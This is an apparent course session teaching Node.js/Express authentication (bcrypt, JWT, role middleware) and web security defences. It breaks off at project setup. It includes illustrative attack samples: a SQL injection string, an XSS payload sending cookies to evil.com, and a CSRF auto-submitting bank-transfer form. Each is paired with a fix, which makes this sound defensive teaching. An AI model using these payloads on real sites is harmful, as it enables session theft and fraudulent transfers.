# 🔐 Session 21: User Authentication and Security

> **Prerequisites:** Node.js, Express.js basics

---

## 📚 Table of Contents

1. [Introduction](#introduction)
2. [Authentication vs Authorization](#auth-vs-authz)
3. [User Registration System](#user-registration)
4. [Login & Session Management](#login-sessions)
5. [JWT Authentication](#jwt-auth)
6. [API Route Protection](#route-protection)
7. [User Roles & Permissions](#roles-permissions)
8. [Security Vulnerabilities](#security-vulnerabilities)
9. [Best Practices](#best-practices)
10. [Hands-On Project](#hands-on-project)

---

## 🎯 Learning Objectives

By the end of this session, you will be able to:

* ✅ Differentiate between authentication and authorization concepts
* ✅ Build secure user registration and login systems with bcrypt and JWT
* ✅ Implement authentication middleware and role-based access control (RBAC)
* ✅ Protect against SQL injection, XSS, and CSRF attacks
* ✅ Configure security headers, HTTPS, rate limiting, and input validation
* ✅ Handle errors securely and manage secrets using environment variables
* ✅ Create a complete production-ready authentication system with protected routes

---

## 🎯 Introduction {#introduction}

### Why Authentication Matters?

Imagine a bank where anyone can walk into any vault without proving who they are. Terrifying, right? That's exactly what web applications without authentication are like!

**Real-World Scenario:**

* 🏪 **E-commerce:** Protect user orders and payment info
* 📧 **Email Services:** Keep messages private
* 🏥 **Healthcare Apps:** Secure patient records
* 💰 **Banking Apps:** Protect financial transactions

### What We'll Build Today

By the end of this session, you'll build a complete authentication system that includes:

* ✅ Secure user registration
* ✅ Password hashing with bcrypt
* ✅ Login with JWT tokens
* ✅ Protected routes
* ✅ Role-based access control

---

## 🔑 Authentication vs Authorization {#auth-vs-authz}

### The Difference Explained

```mermaid
graph LR
    A[User] -->|Login Credentials| B[Authentication]
    B -->|Who are you?| C{Verified?}
    C -->|Yes| D[Authorization]
    C -->|No| E[Access Denied]
    D -->|What can you do?| F{Check Permissions}
    F -->|Admin| G[Full Access]
    F -->|User| H[Limited Access]
    F -->|Guest| I[Read-Only]
```

### Real-World Analogy 🎫

**Authentication** = Showing your ID at airport security

* "Prove you are who you claim to be"
* Username + Password
* Biometrics, OTP, etc.

**Authorization** = Your boarding pass determines where you can sit

* "What are you allowed to do?"
* First Class vs Economy
* Admin vs Regular User

### Key Concepts

| Concept | Authentication | Authorization |
|---------|---------------|---------------|
| **Question** | Who are you? | What can you do? |
| **Process** | Verifying identity | Checking permissions |
| **Method** | Login credentials | Roles & permissions |
| **Example** | Password check | Admin dashboard access |
| **Happens** | Once (at login) | Every request |

---

## 👤 User Registration System {#user-registration}

### The Registration Flow

```mermaid
sequenceDiagram
    participant User
    participant Frontend
    participant Backend
    participant Database
    
    User->>Frontend: Fill registration form
    Frontend->>Frontend: Validate input
    Frontend->>Backend: POST /api/register
    Backend->>Backend: Validate data
    Backend->>Backend: Check if user exists
    Backend->>Backend: Hash password (bcrypt)
    Backend->>Database: Save user
    Database-->>Backend: User created
    Backend-->>Frontend: Success response
    Frontend-->>User: Show success message
```

### Why Hash Passwords? 🔒

**Never store plain text passwords!**

| Storage Method | Risk Level | Example |
|----------------|------------|---------|
| Plain Text | 🔴 CRITICAL | `password123` |
| Simple Encryption | 🟡 HIGH | Reversible |
| Hashing (MD5/SHA1) | 🟠 MEDIUM | Can be rainbow-attacked |
| Bcrypt/Argon2 | 🟢 SAFE | Salted + slow |

### Understanding Bcrypt

**Bcrypt** is like a one-way transformation machine:

```
Input: "myPassword123"
        ↓
    [BCRYPT]
        ↓
Output: "$2b$10$N9qo8uLOickgx2ZMRZoMyeIjZAgcfl7p92ldGxad68LJZdL17lhWy"
```

**Key Features:**

* ⚡ **Slow by design** - Makes brute force attacks impractical
* 🧂 **Automatic salting** - Each hash is unique, even for same password
* 🔢 **Cost factor** - Adjustable difficulty (10-12 recommended)

### Code Implementation: User Registration

```javascript
// 1. Install required packages
// npm install express bcrypt jsonwebtoken mongoose dotenv

// 2. User Model (models/User.js)
const mongoose = require('mongoose');

const userSchema = new mongoose.Schema({
  username: {
    type: String,
    required: true,
    unique: true,
    trim: true,
    minlength: 3
  },
  email: {
    type: String,
    required: true,
    unique: true,
    lowercase: true,
    match: /^[^\s@]+@[^\s@]+\.[^\s@]+$/
  },
  password: {
    type: String,
    required: true,
    minlength: 6
  },
  role: {
    type: String,
    enum: ['user', 'admin', 'moderator'],
    default: 'user'
  },
  createdAt: {
    type: Date,
    default: Date.now
  }
});

module.exports = mongoose.model('User', userSchema);

// 3. Registration Route (routes/auth.js)
const express = require('express');
const bcrypt = require('bcrypt');
const User = require('../models/User');
const router = express.Router();

router.post('/register', async (req, res) => {
  try {
    const { username, email, password } = req.body;

    // Validation
    if (!username || !email || !password) {
      return res.status(400).json({ 
        error: 'All fields are required' 
      });
    }

    // Check if user already exists
    const existingUser = await User.findOne({ 
      $or: [{ email }, { username }] 
    });
    
    if (existingUser) {
      return res.status(409).json({ 
        error: 'User already exists' 
      });
    }

    // Hash password
    const saltRounds = 10;
    const hashedPassword = await bcrypt.hash(password, saltRounds);

    // Create new user
    const newUser = new User({
      username,
      email,
      password: hashedPassword
    });

    await newUser.save();

    res.status(201).json({ 
      message: 'User registered successfully',
      userId: newUser._id 
    });

  } catch (error) {
    console.error('Registration error:', error);
    res.status(500).json({ 
      error: 'Registration failed' 
    });
  }
});

module.exports = router;
```

### Password Strength Visualization

```mermaid
graph TD
    A[Password Input] --> B{Length >= 8?}
    B -->|No| C[❌ Too Short]
    B -->|Yes| D{Contains uppercase?}
    D -->|No| E[⚠️ Weak]
    D -->|Yes| F{Contains numbers?}
    F -->|No| E
    F -->|Yes| G{Contains symbols?}
    G -->|No| H[✅ Medium]
    G -->|Yes| I[✅✅ Strong]
```

---

## 🔓 Login & Session Management {#login-sessions}

### Session-Based vs Token-Based Authentication

```mermaid
graph TB
    subgraph "Session-Based (Traditional)"
        A1[User Login] --> B1[Server Creates Session]
        B1 --> C1[Session ID in Cookie]
        C1 --> D1[Store Session in Memory/DB]
        D1 --> E1[Cookie Sent with Each Request]
    end
    
    subgraph "Token-Based (Modern)"
        A2[User Login] --> B2[Server Creates JWT]
        B2 --> C2[Token Sent to Client]
        C2 --> D2[Client Stores Token]
        D2 --> E2[Token in Authorization Header]
    end
```

### Comparison Table

| Feature | Session-Based | Token-Based (JWT) |
|---------|---------------|-------------------|
| **Storage** | Server memory/DB | Client-side |
| **Scalability** | Harder (sticky sessions) | Easier (stateless) |
| **Mobile Apps** | Complex | Simple |
| **Microservices** | Challenging | Ideal |
| **Logout** | Easy (delete session) | Requires blacklist |

### Login Implementation

```javascript
// Login Route (routes/auth.js)
const jwt = require('jsonwebtoken');

router.post('/login', async (req, res) => {
  try {
    const { email, password } = req.body;

    // Validation
    if (!email || !password) {
      return res.status(400).json({ 
        error: 'Email and password required' 
      });
    }

    // Find user
    const user = await User.findOne({ email });
    if (!user) {
      return res.status(401).json({ 
        error: 'Invalid credentials' 
      });
    }

    // Compare password
    const isPasswordValid = await bcrypt.compare(
      password, 
      user.password
    );

    if (!isPasswordValid) {
      return res.status(401).json({ 
        error: 'Invalid credentials' 
      });
    }

    // Generate JWT token
    const token = jwt.sign(
      { 
        userId: user._id, 
        email: user.email,
        role: user.role 
      },
      process.env.JWT_SECRET,
      { expiresIn: '24h' }
    );

    res.json({ 
      message: 'Login successful',
      token,
      user: {
        id: user._id,
        username: user.username,
        email: user.email,
        role: user.role
      }
    });

  } catch (error) {
    console.error('Login error:', error);
    res.status(500).json({ 
      error: 'Login failed' 
    });
  }
});
```

### Login Flow Diagram

```mermaid
sequenceDiagram
    participant U as User
    participant C as Client
    participant S as Server
    participant DB as Database
    
    U->>C: Enter credentials
    C->>S: POST /api/login
    S->>DB: Find user by email
    DB-->>S: User data
    S->>S: Compare hashed password
    alt Password Valid
        S->>S: Generate JWT
        S-->>C: Token + User data
        C->>C: Store token (localStorage)
        C-->>U: Redirect to dashboard
    else Password Invalid
        S-->>C: 401 Unauthorized
        C-->>U: Show error message
    end
```

---

## 🎫 JWT (JSON Web Tokens) {#jwt-auth}

### What is JWT?

A JWT is like a **digital passport** that proves who you are without needing to check with the database every time.

### JWT Structure

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOiI2MWIzZjQ1YTJjZDMiLCJlbWFpbCI6InVzZXJAZXhhbXBsZS5jb20iLCJpYXQiOjE2Mzk0MjkwMDB9.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c

         HEADER              .            PAYLOAD           .         SIGNATURE
```

```mermaid
graph LR
    A[Header<br/>Algorithm & Type] --> D[.]
    B[Payload<br/>User Data & Claims] --> D
    C[Signature<br/>Verification] --> D
    D --> E[Complete JWT Token]
    
    style A fill:#e1f5ff
    style B fill:#fff3e0
    style C fill:#f3e5f5
```

### JWT Components Explained

#### 1️⃣ Header

```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

#### 2️⃣ Payload

```json
{
  "userId": "61b3f45a2cd3",
  "email": "user@example.com",
  "role": "admin",
  "iat": 1639429000,
  "exp": 1639515400
}
```

#### 3️⃣ Signature

```
HMACSHA256(
  base64UrlEncode(header) + "." +
  base64UrlEncode(payload),
  secret
)
```

### JWT Advantages vs Disadvantages

**✅ Advantages:**

* Stateless (no server-side session storage)
* Scalable across multiple servers
* Perfect for microservices
* Works great with mobile apps
* Contains user information (no DB lookup)

**❌ Disadvantages:**

* Cannot be invalidated before expiry
* Larger than session IDs
* Sensitive data exposed if not encrypted
* Token refresh complexity

### How JWT Works

```mermaid
sequenceDiagram
    participant Client
    participant Server
    participant DB
    
    Note over Client,Server: Login Phase
    Client->>Server: POST /login (credentials)
    Server->>DB: Validate user
    DB-->>Server: User data
    Server->>Server: Generate JWT
    Server-->>Client: Return JWT
    
    Note over Client,Server: Subsequent Requests
    Client->>Server: GET /profile<br/>(Authorization: Bearer JWT)
    Server->>Server: Verify JWT signature
    Server->>Server: Extract user from token
    Server-->>Client: Protected data
    
    Note over Client,DB: No database query needed!
```

---

## 🛡️ API Route Protection {#route-protection}

### Authentication Middleware

Middleware is like a **security guard** that checks everyone before they enter.

```javascript
// middleware/auth.js
const jwt = require('jsonwebtoken');

const authenticateToken = (req, res, next) => {
  try {
    // Get token from header
    const authHeader = req.headers['authorization'];
    const token = authHeader && authHeader.split(' ')[1]; // Bearer TOKEN

    if (!token) {
      return res.status(401).json({ 
        error: 'Access token required' 
      });
    }

    // Verify token
    jwt.verify(token, process.env.JWT_SECRET, (err, decoded) => {
      if (err) {
        return res.status(403).json({ 
          error: 'Invalid or expired token' 
        });
      }

      // Attach user info to request
      req.user = decoded;
      next();
    });

  } catch (error) {
    res.status(500).json({ 
      error: 'Authentication failed' 
    });
  }
};

module.exports = authenticateToken;
```

### Using Middleware in Routes

```javascript
// routes/profile.js
const express = require('express');
const router = express.Router();
const authenticateToken = require('../middleware/auth');

// Public route (no authentication)
router.get('/public', (req, res) => {
  res.json({ message: 'This is public data' });
});

// Protected route (requires authentication)
router.get('/profile', authenticateToken, async (req, res) => {
  try {
    // req.user contains decoded JWT data
    const user = await User.findById(req.user.userId)
      .select('-password'); // Exclude password
    
    res.json({ user });
  } catch (error) {
    res.status(500).json({ error: 'Failed to fetch profile' });
  }
});

// Another protected route
router.put('/profile', authenticateToken, async (req, res) => {
  try {
    const { username } = req.body;
    
    await User.findByIdAndUpdate(
      req.user.userId,
      { username },
      { new: true }
    );
    
    res.json({ message: 'Profile updated' });
  } catch (error) {
    res.status(500).json({ error: 'Update failed' });
  }
});

module.exports = router;
```

### Middleware Flow

```mermaid
graph TD
    A[Client Request] --> B{Has Token?}
    B -->|No| C[❌ 401 Unauthorized]
    B -->|Yes| D{Valid Token?}
    D -->|No| E[❌ 403 Forbidden]
    D -->|Yes| F{Token Expired?}
    F -->|Yes| E
    F -->|No| G[✅ Attach user to req]
    G --> H[Continue to Route Handler]
    H --> I[Return Response]
```

---

## 👥 User Roles & Permissions {#roles-permissions}

### Role-Based Access Control (RBAC)

Think of roles like **job titles** in a company:

* 👨‍💼 **Admin:** CEO - can do everything
* 🧑‍💻 **Moderator:** Manager - can manage content
* 👤 **User:** Employee - limited access
* 👁️ **Guest:** Visitor - read-only

### Role Hierarchy

```mermaid
graph TD
    A[Admin] --> B[Moderator]
    B --> C[User]
    C --> D[Guest]
    
    A -.->|Can do everything| E[Full Access]
    B -.->|Manage content| F[Edit/Delete Posts]
    C -.->|Basic operations| G[Create/View Own]
    D -.->|Read-only| H[View Public]
    
    style A fill:#ff6b6b
    style B fill:#ffd93d
    style C fill:#6bcf7f
    style D fill:#a29bfe
```

### Permission Matrix

| Action | Guest | User | Moderator | Admin |
|--------|-------|------|-----------|-------|
| View public content | ✅ | ✅ | ✅ | ✅ |
| Create posts | ❌ | ✅ | ✅ | ✅ |
| Edit own posts | ❌ | ✅ | ✅ | ✅ |
| Edit any posts | ❌ | ❌ | ✅ | ✅ |
| Delete any posts | ❌ | ❌ | ✅ | ✅ |
| Manage users | ❌ | ❌ | ❌ | ✅ |
| System settings | ❌ | ❌ | ❌ | ✅ |

### Implementing Role-Based Middleware

```javascript
// middleware/authorize.js

// Check for specific roles
const authorizeRoles = (...allowedRoles) => {
  return (req, res, next) => {
    if (!req.user) {
      return res.status(401).json({ 
        error: 'Authentication required' 
      });
    }

    if (!allowedRoles.includes(req.user.role)) {
      return res.status(403).json({ 
        error: 'You do not have permission to access this resource' 
      });
    }

    next();
  };
};

// Check for specific permissions
const checkPermission = (resource, action) => {
  return (req, res, next) => {
    const permissions = {
      admin: ['create', 'read', 'update', 'delete', 'manage'],
      moderator: ['create', 'read', 'update', 'delete'],
      user: ['create', 'read', 'update-own'],
      guest: ['read']
    };

    const userPermissions = permissions[req.user.role] || [];

    if (!userPermissions.includes(action)) {
      return res.status(403).json({ 
        error: `Insufficient permissions to ${action} ${resource}` 
      });
    }

    next();
  };
};

module.exports = { authorizeRoles, checkPermission };
```

### Using Role Middleware

```javascript
// routes/admin.js
const express = require('express');
const router = express.Router();
const authenticateToken = require('../middleware/auth');
const { authorizeRoles } = require('../middleware/authorize');

// Only admins can access
router.get('/dashboard', 
  authenticateToken, 
  authorizeRoles('admin'),
  (req, res) => {
    res.json({ message: 'Admin dashboard data' });
  }
);

// Admins and moderators can access
router.delete('/posts/:id', 
  authenticateToken, 
  authorizeRoles('admin', 'moderator'),
  async (req, res) => {
    // Delete post logic
    res.json({ message: 'Post deleted' });
  }
);

// All authenticated users can access
router.get('/profile', 
  authenticateToken, 
  authorizeRoles('admin', 'moderator', 'user'),
  (req, res) => {
    res.json({ message: 'User profile' });
  }
);

module.exports = router;
```

### Authorization Flow

```mermaid
sequenceDiagram
    participant C as Client
    participant A as Auth Middleware
    participant R as Role Middleware
    participant H as Route Handler
    
    C->>A: Request with JWT
    A->>A: Verify token
    A->>R: Pass user data
    R->>R: Check user role
    alt Role Authorized
        R->>H: Continue
        H-->>C: Return data
    else Role Not Authorized
        R-->>C: 403 Forbidden
    end
```

---

## ⚠️ Security Vulnerabilities {#security-vulnerabilities}

### The Big Three: SQL Injection, XSS, CSRF

```mermaid
mindmap
  root((Web Security<br/>Threats))
    SQL Injection
      Database attacks
      Data theft
      Data manipulation
    XSS
      Script injection
      Cookie theft
      Session hijacking
    CSRF
      Forged requests
      Unauthorized actions
      State changing ops
    Others
      Brute Force
      DDoS
      Man in the Middle
```

---

### 1. SQL Injection (SQLi) 💉

**What is it?**
Attackers insert malicious SQL code into your queries to manipulate your database.

**Example of Vulnerable Code:**

```javascript
// ❌ DANGEROUS - Never do this!
const email = req.body.email;
const query = `SELECT * FROM users WHERE email = '${email}'`;
db.query(query);

// Attacker inputs: ' OR '1'='1
// Resulting query: SELECT * FROM users WHERE email = '' OR '1'='1'
// This returns ALL users!
```

**Real-World Impact:**

* 💳 **2017 Equifax Breach:** 147 million records stolen via SQL injection
* 🏥 **Healthcare Data:** Patient records exposed
* 💰 **Financial Loss:** Millions in damages

**How to Prevent:**

```javascript
// ✅ SAFE - Use parameterized queries
const email = req.body.email;

// With MongoDB (Mongoose) - automatically escaped
const user = await User.findOne({ email: email });

// With SQL databases - use prepared statements
const query = 'SELECT * FROM users WHERE email = ?';
db.query(query, [email]);

// With Sequelize ORM
const user = await User.findOne({ 
  where: { email: email } 
});
```

**SQL Injection Attack Flow:**

```mermaid
graph TD
    A[User Input Field] --> B{Input Validated?}
    B -->|No| C[Malicious SQL Injected]
    B -->|Yes| D[Safe Input]
    C --> E[Query Executed]
    E --> F[💥 Database Compromised]
    D --> G[Parameterized Query]
    G --> H[✅ Safe Execution]
    
    style C fill:#ff6b6b
    style F fill:#ff6b6b
    style D fill:#6bcf7f
    style H fill:#6bcf7f
```

---

### 2. Cross-Site Scripting (XSS) 🕷️

**What is it?**
Attackers inject malicious JavaScript into your website that runs in other users' browsers.

**Types of XSS:**

```mermaid
graph LR
    A[XSS Types] --> B[Stored XSS<br/>Persistent]
    A --> C[Reflected XSS<br/>Non-Persistent]
    A --> D[DOM-Based XSS<br/>Client-Side]
    
    B --> E[Saved in database<br/>Affects all users]
    C --> F[In URL/Form<br/>Affects current request]
    D --> G[Manipulates DOM<br/>Client-side only]
```

**Example Attack:**

```javascript
// ❌ VULNERABLE CODE
// Comment form where attacker submits:
const comment = "<script>
  fetch('http://evil.com/steal?cookie=' + document.cookie)
</script>";

// Later displayed as:
<div>{comment}</div> // Script executes! 💥
```

**Real Impact:**

* 🍪 **Cookie Theft:** Steal session tokens
* 🎣 **Phishing:** Display fake login forms
* 🔑 **Keylogging:** Capture user input
* 🚨 **Defacement:** Change page content

**How to Prevent:**

```javascript
// ✅ SAFE - Escape HTML
const escapeHtml = (text) => {
  const map = {
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;',
    '"': '&quot;',
    "'": '&#039;'
  };
  return text.replace(/[&<>"']/g, (m) => map[m]);
};

// Usage
const safeComment = escapeHtml(userComment);

// In React - automatically escapes
<div>{userComment}</div> // ✅ Safe by default

// If you need HTML, use DOMPurify
import DOMPurify from 'dompurify';
const cleanHTML = DOMPurify.sanitize(dirtyHTML);
```

**Content Security Policy (CSP):**

```javascript
// Add CSP headers
app.use((req, res, next) => {
  res.setHeader(
    'Content-Security-Policy',
    "default-src 'self'; script-src 'self' 'unsafe-inline' trusted-cdn.com"
  );
  next();
});
```

---

### 3. Cross-Site Request Forgery (CSRF) 🎭

**What is it?**
Tricks users into performing unwanted actions on a site where they're authenticated.

**Attack Scenario:**

```mermaid
sequenceDiagram
    participant U as Victim User
    participant E as Evil Site
    participant B as Bank Site
    
    Note over U,B: User is logged into bank
    U->>E: Visits malicious site
    E->>E: Loads hidden form
    E->>B: POST /transfer<br/>(uses victim's cookies)
    B->>B: Sees valid session
    B->>B: Transfers money! 💸
    B-->>E: Success
    Note over U: User doesn't know<br/>anything happened
```

**Example Attack:**

```html
<!-- Evil website contains: -->
<img src="https://bank.com/transfer?to=attacker&amount=1000">

<!-- Or hidden form that auto-submits: -->
<form action="https://bank.com/transfer" method="POST">
  <input type="hidden" name="to" value="attacker">
  <input type="hidden" name="amount" value="1000">
</form>
<script>document.forms[0].submit();</script>
```

**How to Prevent:**

```javascript
// 1. CSRF Tokens
const csrf = require('csurf');
const csrfProtection = csrf({ cookie: true });

app.get('/form', csrfProtection, (req, res) => {
  res.render('form', { csrfToken: req.csrfToken() });
});

app.post('/transfer', csrfProtection, (req, res) => {
  // Token is automatically validated
  // Process transfer
});

// 2. SameSite Cookies
app.use(session({
  secret: 'your-secret',
  cookie: {
    sameSite: 'strict', // or 'lax'
    secure: true,       // HTTPS only
    httpOnly: true      // No JavaScript access
  }
}));

// 3. Check Origin/Referer Headers
app.use((req, res, next) => {
  const origin = req.get('origin');
  const allowedOrigins = ['https://yourdomain.com'];
  
  if (origin && !allowedOrigins.includes(origin)) {
    return res.status(403).json({ error: 'Invalid origin' });
  }
  next();
});
```

---

### Other Important Vulnerabilities

#### 4. Brute Force Attacks 🔨

```javascript
// Rate limiting to prevent brute force
const rateLimit = require('express-rate-limit');

const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 5, // 5 attempts
  message: 'Too many login attempts, please try again later',
  standardHeaders: true,
  legacyHeaders: false,
});

app.post('/login', loginLimiter, async (req, res) => {
  // Login logic
});
```

#### 5. Insecure Direct Object References (IDOR)

```javascript
// ❌ VULNERABLE
app.get('/user/:id', (req, res) => {
  const user = await User.findById(req.params.id);
  res.json(user); // Anyone can access any user!
});

// ✅ SAFE
app.get('/user/:id', authenticateToken, async (req, res) => {
  const requestedId = req.params.id;
  
  // Users can only access their own data
  if (req.user.userId !== requestedId && req.user.role !== 'admin') {
    return res.status(403).json({ error: 'Access denied' });
  }
  
  const user = await User.findById(requestedId);
  res.json(user);
});
```

---

## 🛡️ Security Best Practices {#best-practices}

### The Security Checklist

```mermaid
graph TD
    A[Security Best Practices] --> B[Authentication]
    A --> C[Data Protection]
    A --> D[Communication]
    A --> E[Monitoring]
    
    B --> B1[Strong passwords]
    B --> B2[Password hashing]
    B --> B3[MFA support]
    B --> B4[Session timeout]
    
    C --> C1[Input validation]
    C --> C2[Output encoding]
    C --> C3[Sensitive data encryption]
    C --> C4[Secure cookies]
    
    D --> D1[HTTPS only]
    D --> D2[CORS configuration]
    D --> D3[Security headers]
    D --> D4[CSP policies]
    
    E --> E1[Logging]
    E --> E2[Monitoring]
    E --> E3[Audit trails]
    E --> E4[Error handling]
    
    style A fill:#4a90e2
    style B fill:#7ed321
    style C fill:#f5a623
    style D fill:#bd10e0
    style E fill:#50e3c2
```

### 1. Environment Variables & Secrets Management

**Never hardcode secrets!**

```javascript
// ❌ NEVER DO THIS
const JWT_SECRET = "mysecretkey123";
const DB_PASSWORD = "admin123";

// ✅ DO THIS
// .env file (never commit to git!)
JWT_SECRET=your_super_secure_random_string_here_min_32_chars
DB_PASSWORD=complex_database_password_here
MONGODB_URI=mongodb+srv://username:password@cluster.mongodb.net/dbname
NODE_ENV=production

// .gitignore
.env
.env.local
.env.production

// Load in your app
require('dotenv').config();
const JWT_SECRET = process.env.JWT_SECRET;
```

**Generate Strong Secrets:**

```javascript
// Generate a secure random secret
const crypto = require('crypto');
const secret = crypto.randomBytes(64).toString('hex');
console.log(secret);
// Output: 8f7a9d3e... (128 characters)
```

---

### 2. HTTPS Everywhere 🔒

```mermaid
graph LR
    A[Client] -->|HTTP ❌| B[Insecure]
    A -->|HTTPS ✅| C[Encrypted]
    B --> D[Data visible]
    C --> E[Data protected]
    
    style B fill:#ff6b6b
    style D fill:#ff6b6b
    style C fill:#6bcf7f
    style E fill:#6bcf7f
```

```javascript
// Force HTTPS in production
app.use((req, res, next) => {
  if (process.env.NODE_ENV === 'production' && !req.secure) {
    return res.redirect('https://' + req.headers.host + req.url);
  }
  next();
});

// Set secure cookie options
app.use(session({
  secret: process.env.SESSION_SECRET,
  cookie: {
    secure: true,      // Only sent over HTTPS
    httpOnly: true,    // Not accessible via JavaScript
    sameSite: 'strict', // CSRF protection
    maxAge: 24 * 60 * 60 * 1000 // 24 hours
  }
}));
```

---

### 3. Security Headers

```javascript
// Install helmet
// npm install helmet

const helmet = require('helmet');

app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      styleSrc: ["'self'", "'unsafe-inline'"],
      scriptSrc: ["'self'"],
      imgSrc: ["'self'", "data:", "https:"],
    },
  },
  hsts: {
    maxAge: 31536000,
    includeSubDomains: true,
    preload: true
  }
}));

// Manually set headers
app.use((req, res, next) => {
  // Prevent clickjacking
  res.setHeader('X-Frame-Options', 'DENY');
  
  // Prevent MIME type sniffing
  res.setHeader('X-Content-Type-Options', 'nosniff');
  
  // XSS Protection
  res.setHeader('X-XSS-Protection', '1; mode=block');
  
  // Referrer Policy
  res.setHeader('Referrer-Policy', 'strict-origin-when-cross-origin');
  
  next();
});
```

---

### 4. Input Validation & Sanitization

```javascript
// Install validator
// npm install validator express-validator

const { body, validationResult } = require('express-validator');

// Validation middleware
const validateRegistration = [
  body('username')
    .trim()
    .isLength({ min: 3, max: 20 })
    .withMessage('Username must be 3-20 characters')
    .isAlphanumeric()
    .withMessage('Username must contain only letters and numbers'),
  
  body('email')
    .trim()
    .isEmail()
    .withMessage('Invalid email address')
    .normalizeEmail(),
  
  body('password')
    .isLength({ min: 8 })
    .withMessage('Password must be at least 8 characters')
    .matches(/^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)(?=.*[@$!%*?&])/)
    .withMessage('Password must contain uppercase, lowercase, number, and special character'),
  
  // Check validation results
  (req, res, next) => {
    const errors = validationResult(req);
    if (!errors.isEmpty()) {
      return res.status(400).json({ errors: errors.array() });
    }
    next();
  }
];

// Use in route
app.post('/register', validateRegistration, registerController);
```

---

### 5. Error Handling (Don't Leak Information!)

```javascript
// ❌ BAD - Leaks internal details
app.get('/user/:id', async (req, res) => {
  const user = await User.findById(req.params.id);
  res.json(user);
  // Error: MongoError: Invalid ObjectId "abc123"
  // Attacker learns you use MongoDB!
});

// ✅ GOOD - Generic error messages
app.get('/user/:id', async (req, res) => {
  try {
    const user = await User.findById(req.params.id);
    if (!user) {
      return res.status(404).json({ error: 'User not found' });
    }
    res.json(user);
  } catch (error) {
    // Log detailed error internally
    console.error('Database error:', error);
    
    // Send generic error to client
    res.status(500).json({ error: 'An error occurred' });
  }
});

// Global error handler
app.use((err, req, res, next) => {
  // Log error details for debugging
  console.error(err.stack);
  
  // Don't expose error details in production
  const message = process.env.NODE_ENV === 'production' 
    ? 'Something went wrong' 
    : err.message;
  
  res.status(err.status || 500).json({
    error: message
  });
});
```

---

### 6. Logging & Monitoring

```javascript
// Install winston for logging
// npm install winston

const winston = require('winston');

const logger = winston.createLogger({
  level: 'info',
  format: winston.format.json(),
  transports: [
    new winston.transports.File({ filename: 'error.log', level: 'error' }),
    new winston.transports.File({ filename: 'combined.log' })
  ]
});

// Log authentication attempts
app.post('/login', async (req, res) => {
  const { email, password } = req.body;
  
  try {
    const user = await User.findOne({ email });
    
    if (!user || !(await bcrypt.compare(password, user.password))) {
      // Log failed attempt
      logger.warn('Failed login attempt', {
        email,
        ip: req.ip,
        timestamp: new Date()
      });
      
      return res.status(401).json({ error: 'Invalid credentials' });
    }
    
    // Log successful login
    logger.info('Successful login', {
      userId: user._id,
      email: user.email,
      ip: req.ip,
      timestamp: new Date()
    });
    
    // Generate token and respond
    const token = jwt.sign({ userId: user._id }, process.env.JWT_SECRET);
    res.json({ token });
    
  } catch (error) {
    logger.error('Login error', { error: error.message, stack: error.stack });
    res.status(500).json({ error: 'Login failed' });
  }
});
```

---

### 7. Password Policy Implementation

```javascript
const passwordValidator = require('password-validator');

// Create schema
const schema = new passwordValidator();

schema
  .is().min(8)                                    // Minimum 8 characters
  .is().max(100)                                  // Maximum 100 characters
  .has().uppercase()                              // Must have uppercase
  .has().lowercase()                              // Must have lowercase
  .has().digits(1)                                // Must have at least 1 digit
  .has().symbols(1)                               // Must have at least 1 symbol
  .has().not().spaces()                           // No spaces allowed
  .is().not().oneOf(['Password123!', 'Admin123!']); // Blacklist common

// Validate password
const validatePassword = (password) => {
  const result = schema.validate(password, { details: true });
  if (result.length > 0) {
    return {
      valid: false,
      errors: result.map(err => err.message)
    };
  }
  return { valid: true };
};

// Usage in registration
app.post('/register', async (req, res) => {
  const { password } = req.body;
  
  const validation = validatePassword(password);
  if (!validation.valid) {
    return res.status(400).json({ 
      error: 'Password requirements not met',
      details: validation.errors 
    });
  }
  
  // Continue with registration
});
```

---

### 8. CORS Configuration

```javascript
const cors = require('cors');

// Configure CORS properly
const corsOptions = {
  origin: process.env.NODE_ENV === 'production'
    ? ['https://yourdomain.com', 'https://www.yourdomain.com']
    : 'http://localhost:3000',
  credentials: true, // Allow cookies
  optionsSuccessStatus: 200
};

app.use(cors(corsOptions));

// Or manually
app.use((req, res, next) => {
  const allowedOrigins = ['https://yourdomain.com'];
  const origin = req.headers.origin;
  
  if (allowedOrigins.includes(origin)) {
    res.setHeader('Access-Control-Allow-Origin', origin);
  }
  
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, Authorization');
  res.setHeader('Access-Control-Allow-Credentials', 'true');
  
  if (req.method === 'OPTIONS') {
    return res.sendStatus(200);
  }
  
  next();
});
```

---

### Security Audit Checklist ✅

| Category | Item | Status |
|----------|------|--------|
| **Authentication** | Passwords hashed with bcrypt | ☐ |
| | JWT secrets secure & rotated | ☐ |
| | Rate limiting on login | ☐ |
| | Account lockout after failed attempts | ☐ |
| **Authorization** | Role-based access control | ☐ |
| | User can only access their data | ☐ |
| | Admin routes protected | ☐ |
| **Data Protection** | HTTPS enforced | ☐ |
| | Sensitive data encrypted at rest | ☐ |
| | Secure cookies (httpOnly, secure, sameSite) | ☐ |
| | Input validation on all endpoints | ☐ |
| **Security Headers** | Helmet.js installed | ☐ |
| | CSP configured | ☐ |
| | CORS properly configured | ☐ |
| **Vulnerabilities** | Protected against SQL injection | ☐ |
| | Protected against XSS | ☐ |
| | Protected against CSRF | ☐ |
| | Dependencies up to date | ☐ |
| **Monitoring** | Logging implemented | ☐ |
| | Failed login attempts logged | ☐ |
| | Error handling doesn't leak info | ☐ |
| **Environment** | Secrets in .env file | ☐ |
| | .env not committed to git | ☐ |
| | Different configs for dev/prod | ☐ |

---

## 🎯 Hands-On Project {#hands-on-project}

### Project: Build a Secure Blog API

Let's put everything together and build a complete authentication system!

#### Project Structure

```
secure-blog-api/
├── models/
│   ├── User.js
│   └── Post.js
├── middleware/
│   ├── auth.js
│   └── authorize.js
├── routes/
│   ├── auth.js
│   └── posts.js
├── utils/
│   └── logger.js
├── .env
├── .gitignore
├── server.js
└── package.json
```

---

### Step 1: Setup & Dependencies

```bash
# Initialize project
mkdir secure-blog-api
cd secure-blog-api
